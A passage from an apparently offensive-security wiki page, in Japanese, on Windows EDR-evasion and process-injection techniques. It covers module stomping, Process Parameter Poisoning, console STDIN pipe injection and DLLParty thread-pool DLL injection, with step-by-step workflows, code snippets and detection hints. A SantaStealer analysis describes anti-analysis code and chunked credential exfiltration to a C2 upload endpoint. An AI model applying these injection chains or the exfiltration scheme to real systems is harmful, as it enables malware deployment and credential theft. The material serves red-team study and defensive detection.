実際に見られる一般的なrecon/選択用helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` / 想定外のイメージ読み込みに関する telemetry を避けるため、リモートプロセスですでに **ロード済み** の DLL を優先します。
- 対象アプリケーションで実行される頻度が低い export を優先します。そうでない場合、スレッド作成の前後に通常のコードパスが stomp されたバイト列に到達する可能性があります。
- 大きな implant では、injector のソース内でバッファ全体を正しく表現できるよう、shellcode の埋め込みを文字列リテラルから **バイト配列／波括弧付き初期化子** に変更する必要がある場合があります。

検知のアイデア
- 一般的な private RWX/RX allocation ではなく、**イメージに裏付けられた実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上の export エントリポイントのバイト列が、ディスク上の元ファイルと一致しなくなっている。
- 最近先頭バイトが変更された正規 DLL export 内から実行を開始するリモートスレッドやコンテキストピボット。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の呼び出しに続くスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** 技法です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が `CreateProcessW` の起動パラメータの一部を子プロセスにコピーし、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` がコピーする、poison 可能な carrier

有用な carrier は次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` 指定時）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` に渡す際、**書き込み可能なメモリ**を指している必要があり、null 終端文字を含めて **32,767 Unicode 文字**までに制限されます。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列が余分な `\0` で終端された Unicode 環境ブロックである必要があります。
- `lpReserved` は公式には予約済みのため、`ShellInfo` へのマッピングは安定した文書化済みの契約ではなく、実装の詳細として扱う必要があります。

これにより、通常のプロセス作成が **payload-transfer primitive** になります。オペレーターは攻撃者が制御する起動データを指定して子プロセスを作成し、Windows にプロセス間コピーを実行させます。

### リモート書き込み API を使わないリモート検索フロー

子プロセスの作成後、**読み取り専用**のプリミティブを使ってコピーされたバッファを特定します。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常、実行可能ではなく `RW` です。一般的な P3 チェーンは次のとおりです。

1. プロセスを通常どおり作成する（サスペンド状態にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` を使い、選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されているメインスレッドのハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行先をリダイレクトする

従来のスレッドハイジャックの手順とは異なり、これには `SuspendThread` / `ResumeThread` は**不要**です。返されたメインスレッドのハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションでよく監視される次の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避できます

### Null バイトの制限とステージ化された shellcode

3 つのキャリアはいずれも**文字列または文字列に類するデータ**であるため、`0x00` を含む生のペイロードは転送中に切り詰められます。実用的な回避策は、実行時に定数を再構成し、その後任意の第 2 ステージを読み込む **null-free の第 1 ステージ**です。

単純な方法として、XOR ベースの定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これは、最初のステージが、転送するパラメーターに null byte を埋め込まずに、スタック上に文字列、API 引数、DLL パス、または第 2 ステージの shellcode loader を構築できるようにします。

### 第1ステージからのスタックベースの API 呼び出し

最初のステージで `LoadLibraryA` などの API を呼び出す必要がある場合、次のようにできます。

- 対象プロセスのスタックに文字列／バッファを push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte 境界に整列**させる

続いて、第 2 ステージをスタックから `PAGE_READWRITE` のメモリー領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接の RWX 割り当てを回避できます。

### 検出のヒント

著者が挙げている、有効なハンティングの機会は次のとおりです。

- **プロセスパラメーターのページを実行可能にする** `VirtualProtectEx` / `NtProtectVirtualMemory`
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る動作
- プロセス作成時の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が、異常に長い、あるいは高エントロピーであること

### 注意事項

- P3 は**プロセス間転送の手法**であり、それ自体は完全な実行プリミティブではありません。コピーされたパラメーターには、実行権限への変更と実行先を切り替える方法が別途必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者らも検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブを使用するため、採用されませんでした。

既存の Windows プロセスにスレッドの説明を介してペイロードを送り込み、その後、待機中のスレッドの戻りアドレスをハイジャックする方法については、[Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) を参照してください。

## Console STDIN pipe injection

対話型コンソールの子プロセスを、**ペイロード転送プリミティブ**として利用することもできます。インジェクターは子プロセスの標準入力をパイプにリダイレクトし、マーカーに続けて shellcode を送信します。コンソールプログラムがデータを自身のプライベートメモリーに読み込んだ後、インジェクターはそのバッファーを見つけて実行可能にし、子スレッドの実行先をそこに切り替えます。これにより `VirtualAllocEx` と `WriteProcessMemory` を回避できますが、これは一般的な EDR 回避ではなく、依然としてプロセスインジェクションです。<sup>[[41]](#references)</sup>

「named-pipe」という説明に反して、参考実装は `CreatePipe` を呼び出しており、作成されるのは**匿名パイプ**です。Windows は匿名パイプを内部的に一意な名前を持つパイプオブジェクトとして実装していますが、この PoC は `\\.\pipe\<name>` パスを指定せず、`CreateNamedPipe` も呼び出しません。デフォルトのセキュリティ記述子を使って継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定して、ハンドル継承を有効にして新しい子プロセスを起動します。したがって、この PoC が起動するのは指定されたコンソール実行ファイルであり、既存のプロセスにパイプを接続するわけではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参考ワークフロー

この実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に匿名パイプのペアを作成します。親プロセス側の 2 つのハンドルは継承不可に設定し、プロセス作成後に親プロセス内の子プロセス側ハンドルの複製を閉じます。
2. `CREATE_NEW_CONSOLE` を指定して、`netsh.exe` や `nslookup.exe` などの対話型実行ファイルを起動します。子プロセスはリダイレクトされた標準ハンドルを継承します。
3. 親プロセス側の `STDIN` ハンドルを通じて `WriteFile` で `rawData` 配列全体を送信します。コンソールプログラムはバイト列を読み込み、そのコピーを自身のコミット済みプライベート領域のいずれかに残します。
4. `VirtualQueryEx` で子プロセスのアドレス空間を走査し、`ReadProcessMemory` で候補となる `MEM_PRIVATE` 領域を読み込んで、`rawData` の先頭にあるマーカーを検索します。
5. `VirtualProtectEx` で見つかったバッファーを `PAGE_EXECUTE_READWRITE` に変更します。
6. メインスレッドを特定して一時停止し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから、スレッドを再開します。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込みpayloadはx64 shellcodeです。`rawData`は25バイトのマーカーで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。payloadを置き換える場合は、このレイアウトを維持するか、マーカー、検索ベクトル、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントには、bad characterとして`0x0A`、`0x0D`、`0x1A`も記載されています。このワークフローでは、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブhelperやpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないthread-pool callback DLL injection（DLLParty）

DLLPartyはPoolParty方式のthread-pool injectionを応用し、既存のtarget workerに、注入したcallback stubを実行させる代わりに`LoadLibraryA`を呼び出させます。dispatch primitiveは、target poolのI/O completion portにキューイングされた`TP_DIRECT` completionです。これはprocess permissionsを回避するものではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出すため、読み書き可能なtarget memoryと、複製可能なworker-factoryおよびcompletion-port handleが必要です。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはstack上の`TP_CALLBACK_INSTANCE`へのポインターを、最初のcallback引数として`RCX`に渡します。`LoadLibraryA`は同じポインターを`LPCSTR`として解釈します。検証された経路では、`TppWorkerThread`は`RSP+0x178`にポインターを構築し、そのオブジェクトへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、0x58バイトのこのprefixに収まるnull終端DLL pathは、dispatch前に上書きされずにinstanceの先頭に配置できます。これは特定のbuildでの観測結果であり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参照実装のワークフローは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でtargetのhandleを列挙し、object typeを照会して`TpWorkerFactory`を特定します。worker-factory handleを複製して`WorkerFactoryBasicInformation`を照会します。`StartParameter`からremoteの`TP_POOL`が得られます。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolのprivate worker listをたどります。検証済みのWindows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）では、headは`pool+0x60`にあり、各linkは`worker+0x10`にあります。そのため、`worker+0x38`のcallback-instance slotは`link+0x28`に相当します。PoCは、ポインターのalignment、linkの相互参照、poolの所有関係、ゼロでないthread ID、ノードの重複、安定したlist headを検証します。
3. キューイングされたcompletionをどのworkerが処理するか分からないため、取得した**すべての**worker slotにDLL pathを書き込みます。書き込み可能なtarget memoryに`Callback = LoadLibraryA`を設定した`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`の代わりに、worker stack上の`last_slot-0x500`を使います。このオフセットは実験的なもので、使用中のstack dataと衝突しないようにしてください。
4. targetのcompletion-port handleを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。remoteの`TP_DIRECT` addressがcompletion keyです。既存のworkerが、上書きされたcallback-instanceポインターを使って`LoadLibraryA`を呼び出し、targetがアクセス可能なDLLをロードします。

PoCはtarget PID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`内にhard-codeされたDLL pathを使用します。x64 executableをbuildする前に、targetがアクセスできるpathを設定してください。また、自プロセスの`LoadLibraryA` addressをremote callbackとして使うため、そのaddressがtargetでも有効であることを前提としています。コードはpath lengthが0x58バイトのprefix内に収まるか、worker traversalでslotが見つかってから最後の要素を参照しているかを検証しません。target buildごとにprivate offset、stack layout、書き込み可能領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を使わなくても、process間の書き込みやDLL loadのtelemetryがなくなるわけではありません。<sup>[[46]](#references)[[47]](#references)</sup>

## fileless evasionとcredential theftのためのSantaStealer Tradecraft

SantaStealer（別名BluelineStealer）は、現代のinfo-stealerがAV bypass、anti-analysis、credential accessを単一のワークフローに組み込む手法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layoutによる制限とsandbox遅延

- config flag（`anti_cis`）は`GetKeyboardLayoutList`を使ってインストール済みのkeyboard layoutを列挙します。Cyrillic layoutが見つかると、サンプルは空の`CIS` markerを作成して終了します。これにより、対象外のlocaleでは実行されず、調査用のartifactだけが残ります。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層型 `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前を独自のローリングチェックサムでハッシュ化して、デバッガーやサンドボックスの埋め込みブロックリストと照合する。コンピューター名にも同じチェックサム処理を繰り返し、`C:\analysis` などの作業ディレクトリも確認する。
- Variant B はシステムプロパティ（プロセス数の下限、直近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox Additions を検出し、スリープ前後の時間を確認してシングルステップ実行を検知する。いずれかに該当すると、モジュールが起動する前に処理を中断する。

### Fileless ヘルパー + 二重 ChaCha20 による reflective loading

- メインの DLL/EXE には Chromium の認証情報を扱うヘルパーが埋め込まれており、ディスクにドロップするか、メモリに手動でマッピングする。fileless モードでは、ヘルパーのアーティファクトを書き込まずに、インポートと再配置を独自に解決する。
- このヘルパーは、第 2 段階の DLL を ChaCha20 で二重に暗号化して保持する（32 バイトのキー 2 つと 12 バイトの nonce を使用）。2 回の復号後、blob を reflective に読み込み（`LoadLibrary` は使用しない）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは、direct-syscall による reflective process hollowing を使って稼働中の Chromium ブラウザーに注入し、AppBound Encryption のキーを継承して、ABE の強化にもかかわらず SQLite データベースからパスワード、cookie、クレジットカード情報を直接復号する。

### モジュール式のメモリ内収集と分割 HTTP 流出

- `create_memory_based_log` は、グローバルな関数ポインターテーブル `memory_generators` を反復処理し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザー拡張機能など）ごとにスレッドを 1 つ起動する。各スレッドは共有バッファーに結果を書き込み、約 45 秒の join 後にファイル数を報告する。
- 完了後、静的リンクされた `miniz` ライブラリを使ってすべてを `%TEMP%\\Log.zip` に圧縮する。次に `ThreadPayload1` は 15 秒スリープし、アーカイブを 10 MB ごとのチャンクに分けて、ブラウザーの `multipart/form-data` 境界（`----WebKitFormBoundary***`）を偽装しながら、HTTP POST で `http://<C2>:6767/upload` に送信する。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後のチャンクには C2 が再構成の完了を把握できるよう `complete: true` が追加される。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
